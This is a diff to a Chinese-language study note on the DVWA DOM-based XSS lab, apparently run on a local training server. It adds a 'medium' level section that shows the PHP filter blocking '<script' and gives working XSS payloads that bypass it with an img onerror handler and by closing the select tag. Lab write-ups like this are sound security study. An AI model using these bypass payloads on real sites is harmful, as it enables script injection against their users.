@@ -45,3 +45,50 @@
 http://192.168.0.111:8000/vulnerabilities/xss_d/?default=English%3Cscript%3Ealert(/xss/)%3C/script%3E
 ```
 
+
+
+
+
+
+
+### medium
+
+> 中级
+
+```php
+<?php
+
+// Is there any input?
+if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
+    $default = $_GET['default'];
+    
+    # Do not allow script tags
+    if (stripos ($default, "<script") !== false) {
+        header ("location: ?default=English");
+        exit;
+    }
+}
+
+```
+
+> 做了过滤： stripos：stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。
+>
+>  [runoob](https://www.runoob.com/php/func-string-stripos.html)
+
+```shell
+# img 做弹窗
+http://192.168.0.111:8000/vulnerabilities/xss_d/?default=English%3Cimg%20src=1%20onerror=alert(/xss/)%3E
+
+# 写入到 value 中了
+<option value="English%3Cimg%20src=1%20onerror=alert(/xss/)%3E">English</option>
+
+# 绕过 加</select>闭合这个html
+http://192.168.0.111:8000/vulnerabilities/xss_d/?default=English%3C/select%3E%3Cimg%20src=1%20onerror=alert(/xss/)%3E
+```
+
+
+
+
+
+
+
